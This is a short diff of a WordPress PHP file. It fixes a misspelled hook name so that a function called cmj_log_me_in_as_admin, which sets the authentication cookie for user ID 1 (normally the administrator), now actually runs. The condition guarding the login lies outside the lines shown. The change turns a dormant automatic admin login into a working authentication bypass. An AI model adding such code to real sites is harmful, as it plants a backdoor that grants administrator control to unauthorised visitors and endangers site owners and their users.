@@ -8,6 +8,6 @@ function cmj_log_me_in_as_admin() {
 		wp_set_auth_cookie(1);
 	}
 }
-add_action( 'after_setuo_theme', 'cmj_log_me_in_as_admin' );
+add_action( 'after_setup_theme', 'cmj_log_me_in_as_admin' );
 
 ?>
